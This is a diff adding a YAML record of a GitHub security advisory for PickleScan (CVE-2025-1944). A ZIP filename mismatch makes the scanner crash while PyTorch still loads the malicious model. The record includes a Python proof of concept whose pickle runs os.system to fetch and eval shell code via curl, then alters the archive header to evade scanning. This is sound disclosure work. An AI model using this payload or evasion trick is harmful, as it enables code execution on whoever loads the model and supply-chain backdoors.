@@ -1,0 +1,114 @@
+advisory_id: GHSA-7q5r-7gvp-wc82
+datasource_id: github_osv/GHSA-7q5r-7gvp-wc82
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-7q5r-7gvp-wc82/GHSA-7q5r-7gvp-wc82.json
+aliases:
+  - CVE-2025-1944
+summary: "Zip Exploit Crashes Picklescan But Not PyTorch\n### Summary\n\nPickleScan is vulnerable\
+  \ to a ZIP archive manipulation attack that causes it to crash when attempting to extract\
+  \ and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping\
+  \ the original filename in the directory listing, an attacker can make PickleScan raise a\
+  \ BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the\
+  \ model to be loaded, enabling malicious payloads to bypass detection.\n\n### Details\n\n\
+  Python's built-in zipfile module performs strict integrity checks when extracting ZIP files.\
+  \ If a filename stored in the ZIP header does not match the filename in the directory listing,\
+  \ zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract\
+  \ and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.\n\
+  \nPyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these\
+  \ discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit\
+  \ this behavior to embed a malicious pickle file inside a model archive, which PyTorch will\
+  \ load, while preventing PickleScan from scanning the archive.\n\n### PoC\n```\nimport os\n\
+  import torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system,\
+  \ (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\n\
+  file = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header\
+  \ to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n\
+  \    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\
+  \nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified\
+  \ content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected\
+  \ model\ntorch.load(file)  \n```\n\n### Impact\n\nSeverity: `High`\n\n- Who is impacted? Any\
+  \ organization or individual using PickleScan to detect malicious pickle files in PyTorch\
+  \ models.\n\n- What is the impact? Attackers can embed malicious payloads inside PyTorch model\
+  \ archives while preventing PickleScan from scanning them.\n\n- Potential Exploits: This technique\
+  \ can be used in supply chain attacks to distribute backdoored models via platforms like Hugging\
+  \ Face.\n\n### Recommendations\n\n- Use a More Tolerant ZIP Parser: PickleScan should handle\
+  \ minor ZIP header inconsistencies more gracefully instead of failing outright.\n\n- Detect\
+  \ Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract\
+  \ valid files."
+impacted_packages:
+  - purl: pkg:github/mmaitre314/picklescan
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mmaitre314/picklescan
+        commit: e58e45e0d9e091159c1554f9b04828bbb40b9781
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:pypi/picklescan
+    affected_versions: vers:pypi/<0.0.23
+    fixed_versions: vers:pypi/0.0.23
+    affected_packages:
+      - pkg:pypi/picklescan@0.0.1
+      - pkg:pypi/picklescan@0.0.2
+      - pkg:pypi/picklescan@0.0.3
+      - pkg:pypi/picklescan@0.0.4
+      - pkg:pypi/picklescan@0.0.5
+      - pkg:pypi/picklescan@0.0.6
+      - pkg:pypi/picklescan@0.0.7
+      - pkg:pypi/picklescan@0.0.8
+      - pkg:pypi/picklescan@0.0.9
+      - pkg:pypi/picklescan@0.0.10
+      - pkg:pypi/picklescan@0.0.11
+      - pkg:pypi/picklescan@0.0.12
+      - pkg:pypi/picklescan@0.0.13
+      - pkg:pypi/picklescan@0.0.14
+      - pkg:pypi/picklescan@0.0.15
+      - pkg:pypi/picklescan@0.0.16
+      - pkg:pypi/picklescan@0.0.17
+      - pkg:pypi/picklescan@0.0.18
+      - pkg:pypi/picklescan@0.0.19
+      - pkg:pypi/picklescan@0.0.20
+      - pkg:pypi/picklescan@0.0.21
+      - pkg:pypi/picklescan@0.0.22
+    fixed_packages:
+      - pkg:pypi/picklescan@0.0.23
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-7q5r-7gvp-wc82/GHSA-7q5r-7gvp-wc82.json
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-7q5r-7gvp-wc82/GHSA-7q5r-7gvp-wc82.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-345
+references:
+  - url: https://github.com/mmaitre314/picklescan
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781
+    reference_type:
+    reference_id:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/picklescan/PYSEC-2025-20.yaml
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-1944
+    reference_type:
+    reference_id: CVE-2025-1944
+  - url: https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944
+    reference_type:
+    reference_id: CVE-2025-1944
+  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82
+    reference_type:
+    reference_id: GHSA-7q5r-7gvp-wc82
+exploits: []
